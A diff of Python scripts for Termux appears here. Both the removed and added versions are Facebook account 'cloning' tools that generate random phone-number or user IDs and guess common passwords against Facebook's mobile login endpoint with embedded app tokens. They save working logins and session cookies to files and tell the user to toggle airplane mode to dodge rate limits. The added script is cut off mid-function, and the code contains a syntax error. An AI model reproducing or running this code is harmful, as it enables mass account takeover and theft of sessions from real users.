@@ -1,77 +1,47 @@
-#__________________[ IMPORT ]__________________#
-import os,zlib
-from os import system as osRUB
-from os import system as cmd
-os.system('clear')
-#print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] GIFTED BY Tharkii ')
-os.system(f'pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests') 
+W = '\033[97;1m' 
+R = '\033[97;1m' 
+G = '\033[97;1m' 
+Y = '\033[97;1m' 
+B = '\033[97;1m'
+P = '\033[97;1m'
+C = '\033[97;1m'
+N = '\x1b[0m'
+
+
+import os
 try:
-    import requests 
+	import requests
 except ImportError:
-    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING REQUESTS ')
-    os.system('pip install requests')
+	os.system("pip install requests")
+
 try:
-    import concurrent.futures
+	import concurrent.futures
 except ImportError:
-    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING FUTURES ')
-    os.system('pip install futures')
-try:
-    import mechanize
-except ModuleNotFoundError:
-    os.system('pip install mechanize > /dev/null')
-from urllib.request import Request, urlopen
-import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as sanjidabou
-from string import * 
-from random import randint
-from time import sleep as slp
-from os import system as cmd
-from zlib import decompress 
-import os, platform
+	os.system("pip install futures")
+
+import os
+import sys
+import time
+import requests
+import random
+import platform
+import base64
+import subprocess
 from concurrent.futures import ThreadPoolExecutor
-fast_work = ThreadPoolExecutor(max_workers=15).submit
-def mar():
-     device_model = random.choice(["Nokia 6.1", "Samsung Galaxy S9", "Pixel 4a", "OnePlus 7T"])
-     ua= "[FBAN/FB4A;FBAV/{random.randint(['75.0.0.23.69','354.0.0.8.108','414.0.0.30.113'])};FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/{device_model};FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
-     ua ="[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
-     return ua
-#__________________[ LOOP ]__________________#
-totaldmp = 0
-count = 0
-loop = 0
-oks = []
-cps = []
-id = []
-ps = []
-sid = []
-total=[]
-methods = []
-srange = 0
-saved = []
-totaldmp = 0
-filter = []
-loop,ok,cp,user = 0,[],[],[]
-cok,plist = [],[]
-#__________________[ SYS ]__________________#
-sys.stdout.write('\x1b]2; PRASHANT\x07')
-head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-#__________________[ COLOUR ]__________________#
-A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
-S = '\x1b[1;96m'
-M = '\x1b[38;5;205m'
-RED = '\033[1;31m'
-wx = '\033[1;37m'
-GREEN = '\033[1;32m' 
-YELLOW = '\033[1;33m'
-BLUE = '\033[1;34m'
-pink = '\033[1;35m'
-G3 = '\x1b[38;5;48m'
-#__________________[ LINEX ]__________________#
-def clear():os.system('clear');print(logo)
-def linex():print(f'{A}──────────────────────────────────────────────────')
-#__________________[ LOGO ]__________________#
-logo =f"""\x1b[1;97m   
-\033[1;33m   
+
+def logo():
+	print ("""
+   
+ ───────────────────────────────────────────────────────×
+  ───────────────────────────────────────────────────────×
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Wasi Qureshi\x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :5\x1b[0m\x1b[1;97m] \033[1;37m 
+ ───────────────────────────────────────────────────────×
+ """)
+def logo2():
+	#Yahan apna logo paste krna hw
+	print ("""
+   
   /$$$$$$           
  /$$__  $$          
 | $$  \__/  /$$$$$$ 
@@ -83,399 +53,329 @@ logo =f"""\x1b[1;97m
           | $$      
           | $$      
           |__/      
-{A}──────────────────────────────────────────────────"""
-#__________________[ RESULT ]__________________#
-def result(OKs,cps):
-    if len(OKs) != 0 or len(cps) != 0:
-        print(f'\r{A}──────────────────────────────────────────────────')
-        print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETE...')
-        print(f'{G1}[{A}={G2}]{G2} TOTAL OK {A}:{G2} %s' % str(len(oks)))
-        print(f'{G1}[{A}={G2}]{G3} TOTAL CP {A}:{G3} %s' % str(len(cps)))
-        print(f'\r{A}──────────────────────────────────────────────────')
-        input(f"{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK MENU ")
-        exit()
-#__________________[ MENU ]__________________#
-def menu():   
-    clear()
-    print(f'{G1}[{A}1{G1}]{G1} FILE CLONING')
-    print(f'{G1}[{A}2{G2}]{G2} RANDOM CLONING')
-    print(f'{G1}[{A}4{G3}]{G3} AUTO CREAT CLONING')
-    print(f'{G1}[{G4{G4}]{G4}print(f'{G1}[{A}4{G4}]{G4} CONTACT TOOL OWNER')
-    
-    print(f'{G1}[{A}0{G4}]{G4} EXIT TOOLS')
-    print(f'Tool Type : \033[1;33m trail\033[1;37m')
-    print(f'NOTE : \033[1;31m JYA  GORKHALI :)\033[1;37m')
-    linex()
-    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
-    if select =='1':
-        _file_()
-        os.system('xdg-open https://chat.whatsapp.com/C8ZBho9Rrt92glLoKu3PKL')
-    elif select =='2':
-        _randm_()
-        os.system('xdg-open https://chat.whatsapp.com/C8ZBho9Rrt92glLoKu3PKL')
-    elif select =='3':
-        os.system('xdg-open https://chat.whatsapp.com/C8ZBho9Rrt92glLoKu3PKL')
-        menu()
-    elif select =='0':
-        os.system('xdg-open https://chat.whatsapp.com/C8ZBho9Rrt92glLoKu3PKL')
-        exit(f'{G1}[{A}={G1}]{G1} EXIT DONE ')
-    else:
-        print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
-        time.sleep(2)
-        menu()
-#__________________[ RANDOM ]__________________#      
-def _randm_():   
-    clear()
-    print(f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONING')
-    print(f'{G1}[{A}2{G2}]{G2} INDIA CLONING')
-    print(f'{G1}[{A}0{G3}]{G3} BACK TO MAIN MENU')
-    linex()
-    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
-    if select =='1':
-        _bd_()
-        os.system('xdg-open https://chat.whatsapp.com/C8ZBho9Rrt92glLoKu3PKL')
-    elif select =='2':
-        _India_()
-    elif select =='0':
-    	menu()
-    else:
-        print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
-        time.sleep(2)
-        _randm_()
-#__________________[ BANGLADESH ]__________________#
-def _bd_():
-    clear()
-    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} 26138{A}/{G1}26134{A}/{G1}26132{A}/{G1}26133');linex()
-    code = input(f'{G1}[{A}?{G2}]{G2} CHOICE  {A}:{G2} ')
-    name = ''.join(random.choice(string.digits) for _ in range(2))
-    cod = ''.join(random.choice(string.digits) for _ in range(2))
-    clear()
-    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
-    limit = int(input(f'{G1}[{A}?{G4}]{G4} CHOICE  {A}:{G4} '))
-    for x in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(4))
-        user.append(nmp)
-    clear()
-    with sanjidabou(max_workers=30) as sexy:
-        clear()
-        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
-        print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
-        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN');linex()
-        for love in user:
-            ids = code+name+cod+love
-            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'77889900','malala','fitiavana','Fitiavana','safidy','Safidy','nirina','Nirina','rakoto','Rakoto','avotra','nomena','mamako','Mamako','malagasy','santatra','randria','Randria','finaritra','faniry','hasina','Hasina','fifaliana','mirana','tolotra','silako','lataka','Lataka','milely','Milely','tabory']
-            sexy.submit(randm,ids,psd)
-    print('')
-    print(f'\r{A}──────────────────────────────────────────────────')
-    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
-    print(f'{G1}[{A}={G2}]{G2} TOTAL OK ID {A}:{G2} {str(len(ok))}')
-    print(f'{G1}[{A}={G3}]{G3} TOTAL CP ID {A}:{G3} {str(len(cp))}')
-    print(f'\r{A}──────────────────────────────────────────────────')
-    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
-    menu()
-#__________________[ INDIA ]__________________#
-def _India_():
-    clear()
-    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} +26138{A}/{G1}+26134{A}/{G1}+26132{A}/{G1}+26133');linex()
-    code = input(f'{G1}[{A}?{G2}]{G2} CHOICE  {A}:{G2} ')
-    clear()
-    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
-    limit = int(input(f'{G1}[{A}?{G4}]{G4} CHOICE  {A}:{G4} '))
-    for x in range(limit):
-        nmp = "". join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    clear()
-    with sanjidabou(max_workers=30) as sexy:
-        clear()
-        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
-        print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
-        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN');linex()
-        for love in user:
-            ids = code+love
-            psd = [love,ids[:8],'57273200','59039200','57575751','77889900','malala','fitiavana','Fitiavana','safidy','Safidy','nirina','Nirina','rakoto','Rakoto','avotra','nomena','mamako','Mamako','malagasy','santatra','randria','Randria','finaritra','faniry','hasina','Hasina','fifaliana','mirana','tolotra','silako','lataka','Lataka','milely','Milely','tabory']
-            sexy.submit(randm,ids,psd)
-    print('')
-    print(f'\r{A}──────────────────────────────────────────────────')
-    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
-    print(f'{G1}[{A}={G2}]{G2} TOTAL OK ID {A}:{G2} {str(len(ok))}')
-    print(f'{G1}[{A}={G3}]{G3} TOTAL CP ID {A}:{G3} {str(len(cp))}')
-    print(f'\r{A}──────────────────────────────────────────────────')
-    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
-    menu()
-#__________________[ FILE ]__________________#      
-def _file_():
-    global methods
-    clear()
-    print(f'{G1}[{A}1{G1}]{G1} METHOD {G1}[{A}M1{G1}]{G1} ')
-    print(f'{G1}[{A}2{G2}]{G2} METHOD {G2}[{A}M2{G2}]{G1} ')
-    linex()
-    option = input(f'{G1}[{A}?{G3}]{G3} CHOICE {A}:{G3} ')
-    if option =='1':
-        methods.append('methodA')
-        main_crack().crack(id)
-    elif option =='2':
-        methods.append('methodB')
-        main_crack().crack(id)
-    elif option =='0':
-        _file_()
-    else:
-      print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
-      time.sleep(2)
-      _file_()
+                                                                         
+ ───────────────────────────────────────────────────────×
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Wasi Qureshi\x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 
+ ───────────────────────────────────────────────────────×
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-Qureshi \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Mr-Qureshi-xd \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./MrQureshi-xd \x1b[0m\x1b[1;97m]
+───────────────────────────────────────────────────────× 
+ """)
 
-class main_crack():
-    def __init__(self):
-        self.id=[]
-    def crack(self,id):
-        global methods
-        clear()
-        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/SP.txt');linex()
-        self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
-        try:
-            self.id = open(self.file).read().splitlines()
-            self.pasw()
-        except FileNotFoundError:
-            print(f'{G1}[{A}={G2}]{G2} OPPS FILE NOT FOUND ...')
-            time.sleep(2)
-            os.system('clear')
-            print(logo)
-            print(f'{G1}[{A}={G2}]{G2} TRY AGAIN ...')
-            time.sleep(2)
-            main_crack().crack(id)
-#__________________[ FILE METHOD M1 ]__________________#           
-    def methodA(self, sid, name, psw):
-        try:
-            global oks,cps,loop
-            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
-            sys.stdout.write(f"\r{G1}[{A}SP-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
-            sys.stdout.flush()
-            fs = name.split(' ')[0]
-            try:
-                ls = name.split(' ')[1]
-            except:
-                ls = fs
-            for pw in psw:
-                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
-                with requests.Session() as session:
-                    data = {"adid": str(uuid.uuid4()),
-                    "format": "json",
-                    "device_id": str(uuid.uuid4()),
-                    "cpl": "true",
-                    "family_device_id": str(uuid.uuid4()),
-                    "credentials_type": "device_based_login_password",
-                    "error_detail_type": "button_with_disabled",
-                    "source": "device_based_login",
-                    "email": sid,
-                    "password": ps,
-                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-                    "generate_session_cookies": "1",
-                    "meta_inf_fbmeta": "",
-                    "advertiser_id": str(uuid.uuid4()),
-                    "currently_logged_in_userid": "0",
-                    "locale": "en_GB",
-                    "client_country_code": "GB",
-                    "method": "auth.login",
-                    "fb_api_req_friendly_name": "authenticate",
-                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                    "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {
-                    'User-Agent': mar(),
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Host': 'graph.facebook.com',
-                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-Connection-Type': 'MOBILE.LTE',
-                    'X-Tigon-Is-Retry': 'False',
-                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                    'x-fb-device-group': '5120',
-                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                    'X-FB-Request-Analytics-Tags': 'graphservice',
-                    'X-FB-HTTP-Engine': 'Liger',
-                    'X-FB-Client-IP': 'True',
-                    'X-FB-Server-Cluster': 'True',
-                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
-                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
-                if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{G1}[SP-OK] {sid} | {ps} ")
-                    print(f"\r\r{G1}[COOKIE]{A} {ckkk}")
-                    open('/sdcard/SP-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
-                    oks.append(sid)
-                    break
-                elif 'www.facebook.com' in q['error']['message']:
-                     print(f"\r\r{M}[SP-CP] {sid} | {ps} ")
-                     open('/sdcard/SP-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
-                     cps.append(sid)
-                     break
-                else:
-                    continue
-            loop+=1
-        except requests.exceptions.ConnectionError:
-            self.methodA(sid, name, ps)
-#__________________[ FILE METHOD M2 ]__________________#             
-    def methodB(self, sid, name, psw):
-        try:
-            global oks,cps,loop
-            sys.stdout.write(f"\r{G1}[{A}SP-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
-            sys.stdout.flush()
-            fs = name.split(' ')[0]
-            try:
-                ls = name.split(' ')[1]
-            except:
-                ls = fs
-            for pw in psw:
-                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
-                with requests.Session() as session:
-                    data = {"adid": str(uuid.uuid4()),
-                    "format": "json",
-                    "device_id": str(uuid.uuid4()),
-                    "cpl": "true",
-                    "family_device_id": str(uuid.uuid4()),
-                    "credentials_type": "device_based_login_password",
-                    "error_detail_type": "button_with_disabled",
-                    "source": "device_based_login",
-                    "email": sid,
-                    "password": ps,
-                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-                    "generate_session_cookies": "1",
-                    "meta_inf_fbmeta": "",
-                    "advertiser_id": str(uuid.uuid4()),
-                    "currently_logged_in_userid": "0",
-                    "locale": "en_GB",
-                    "client_country_code": "GB",
-                    "method": "auth.login",
-                    "fb_api_req_friendly_name": "authenticate",
-                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                    "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': '[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Host': 'graph.facebook.com',
-                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-Connection-Type': 'MOBILE.LTE',
-                    'X-Tigon-Is-Retry': 'False',
-                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                    'x-fb-device-group': '5120',
-                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                    'X-FB-Request-Analytics-Tags': 'graphservice',
-                    'X-FB-HTTP-Engine': 'Liger',
-                    'X-FB-Client-IP': 'True',
-                    'X-FB-Server-Cluster': 'True',
-                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
-                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
-                if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{G1}[SP-OK] {sid} | {ps} ")
-                    print(f'\r\r{G1}[COOKIE]{A} {ckkk}')
-                    open('/sdcard/SP-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
-                    oks.append(sid)
-                    break
-                elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r\r{M}[SP-CP] {sid} | {ps} ")
-                    open('/sdcard/SP-M2-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
-                    cps.append(sid)
-                else:
-                    continue
-            loop+=1
-        except requests.exceptions.ConnectionError:
-            self.methodC(sid, name, ps)
-#__________________[ PASSWORD ]__________________#
-    def pasw(self):       
-            pw = []
-            clear()
-            print(f'{G1}[{A}={G2}]{G2} EXAMPLE {A}:{G2} / Best 20 Pass');linex()
-            sl = int(input(f'{G1}[{A}?{G3}]{G3} PASSWORD LIMIT {A}:{G3} '))
-            clear()
-            print(f'{G1}[{A}?{G4}]{G4} EXAMPLE {A}:{G4} first123/firstlast/first@123 etc: ')
-            linex()
-            if sl =='':
-                print(f'{G1}[{A}={G5}]{G5} PUT LIMIT BETWEEN 1 TO 20 ')
-            elif sl > 20:
-                print(f'{G1}[{A}={G1}]{G1} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 20')
-            else:
-                for sr in range(sl):
-                    pw.append(input(f'{G1}[{A}={G1}]{G1} PASSWORD NO {G1}[{A}{sr+1}{G1}] {A}:{G1} '))
-            clear()
-            print(f'{G1}[{A}={G1}]{G1} TOTAL FILE UID {A}:{G1} %s ' % len(self.id))
-            print(f'{G1}[{A}={G2}]{G2} PASSWORD LIMIT {A}:{G1} {sl} ')
-            print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN')
-            linex()
-            with sanjidabou(max_workers=20) as SHAJON:
-                for zsb in self.id:
-                   try:
-                       uid, name = zsb.split('|')
-                       sz = name.split(' ')
-                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
-                           pwx =  pw
-                       else:
-                            pwx =  pw
-                            if 'methodA' in methods:
-                                SHAJON.submit(self.methodA, uid, name, pwx)
-                            elif 'methodB' in methods:
-                                SHAJON.submit(self.methodB, uid, name, pwx)
-                   except:pass
-            result(oks,cps)
-#__________________[ RANDOM METHOD ]__________________#
-def randm(ids,psd):
-    global loop,ok,cp
-    sys.stdout.write(f"\r{G1}[{A}PRASHANT{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
-    sys.stdout.flush()
-    access_token = f'2560'+'02347743'+'983|374e'+'60f8b9bb'+'6b8cbb30f7'+'8030438895'
-    try:
-        for pas in psd:
-            data = {'adid':str(uuid.uuid4()),
-                                'format':'json',
-                                'device_id':str(uuid.uuid4()),
-                                'email':ids,'password':pas,
-                                'generate_analytics_claims':'1',
-                                'community_id':'',
-                                'cpl':'true',
-                                'try_num':'1',
-                                'family_device_id':str(uuid.uuid4()),
-                                'credentials_type':'password',
-                                'source':'login',
-                                'error_detail_type':'button_with_disabled',
-                                'enroll_misauth':'false',
-                                'generate_session_cookies':'1',
-                                'generate_machine_id':'1',
-                                'currently_logged_in_userid':'0',
-                                'locale': 'fr_US','client_country_code': 'US',
-                                'fb_api_req_friendly_name':'authenticate',
-                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
-                                'access_token':access_token}
-            head = {'User-Agent': mar(),
-                                'Accept-Encoding': 'gzip, deflate',
-                                'Connection': 'Keep-Alive',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'Host': 'graph.facebook.com',
-                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                'X-FB-Connection-Type': 'MOBILE.LTE',
-                                'X-Tigon-Is-Retry': 'False',
-                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                                'x-fb-device-group': '5120',
-                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                                'X-FB-Request-Analytics-Tags': 'graphservice',
-                                'X-FB-HTTP-Engine': 'Liger',
-                                'X-FB-Client-IP': 'True',
-                                'X-FB-Server-Cluster': 'True',
-                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
-            url = 'https://b-graph.facebook.com/au'+'th/lo'+'gin'
-            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
-            q = json.loads(po)
-            if 'access_token' in q:
-                uid = str(q['uid'])
-                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                print(f'\r\r{G1}[PRASHANT-OK] {uid} | {pas}')
-                print(f'\r\r{G1}[COOKIE]{A} {coki}')
-                open('/sdcard/PRASHANT-R-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
-                ok.append(uid)
-                break
-            else:continue
-        loop+=1
-    except Exception as e:
-        pass
-          
-menu()
-#__________________[ END ]__________________#
+def runtxt(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+os.system('termux-setup-storage')
+
+def helpnote():
+	print("%s [=>] FOLLOW ME ON  FB TU KNOW ABOUT UPDATES  :)"%(G))
+	#yahan apni facebook id link dalna
+	exit(" [=>] FACEBOOK https://www.facebook.com/sabin.best.35 ")
+
+
+   
+plist = (platform.uname())[2]
+basex = plist
+basex1 = basex.encode('ascii')
+basex2 = base64.b64encode(basex1)
+basex3 = basex2.decode('ascii')
+base4 = (basex3).upper()
+basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')
+
+
+class Main:
+	def __init__(self):
+		self.id = []
+		self.ok = []
+		self.cp = []
+		self.loop = 0
+		try:
+			if basesplit in plr:
+				key = basesplit
+				stat = ("\033[0;97mPREMIUM")
+				FY = '\033[0;97m'
+				FG = '\033[0;97m'
+				GET = '\r'
+			else:
+				key = ("\033[0;97m -")
+				stat = ("\033[0;97mFREE USER")
+				FY = '\033[0;90m'
+				FG = '\033[0;90m'
+				GET = '\033[0;97m [P] GET PREMIUM'
+		except requests.exceptions.ConnectionError:
+			print("\n%s [!] NO INTERNET CONNECTION..\n"%(R))
+			exit()
+		os.system("clear")
+		#yahan logo lagana apna
+		print ("""
+  
+  /$$$$$$           
+ /$$__  $$          
+| $$  \__/  /$$$$$$ 
+|  $$$$$$  /$$__  $$
+ \____  $$| $$  \ $$
+ /$$  \ $$| $$  | $$
+|  $$$$$$/| $$$$$$$/
+ \______/ | $$____/ 
+          | $$      
+          | $$      
+          |__/      
+                                   
+ ───────────────────────────────────────────────────────×
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Wasi Qureshi\x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 6\x1b[0m\x1b[1;97m] \033[1;37m 
+ ───────────────────────────────────────────────────────×
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-Qureshi \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Mr-Qureshi-xd \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./MrQureshi-xd \x1b[0m\x1b[1;97m]
+───────────────────────────────────────────────────────× 
+    """)
+		print("%s [%s•%s] %sTOOL NAME : %s2009 Cloning Tool"%(G,R,G,B,G))
+		print("%s [%s•%s] %sVERSION   : %s6"%(G,R,G,B,G))
+		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
+		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
+		print("───────────────────────────────────────────────────────× ")
+		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m SUBCRIBE MY CHANEL FIRST\x1b[0m\x1b[1;97m] \033[1;37m ")
+		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCOo-omO_OVoU0B1109O0Z8g"])
+		print("───────────────────────────────────────────────────────× ")
+		print("%s [%s1%s]%s CRACK RANDOM FB ID 2009-11 {JUST NOW} %s(Free Trail)"%(G,R,G,Y,B))
+		tanya = input("    \033[0;97m(=×>)\033[0;97m CHOOSE : ")
+		print("───────────────────────────────────────────────────────× ")
+		if tanya in ["", " "]:
+			Main()
+		elif tanya in ["1", "01"]:
+			if basesplit in plr:
+			        self.fbtua()
+			else: 
+				notice()
+				exit()
+		else:
+			Main()
+#yahan nichy kch cherna ni just name chnge krna
+	def fbtua(self):
+		x = 11111111
+		xx = 99999999
+		idx = "1000000" 
+		limit = int(input("    \033[0;97m[=>]\033[0;97m TYPE 10000 (LIMIT 50000): "))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			
+			print("\033[0;97m [=>] TOTAL ID -> \033[0;97m%s\033[0;97m"%(len(self.id))) 
+			os.system("clear")
+			logo2()
+			with ThreadPoolExecutor(max_workers=30) as coeg:
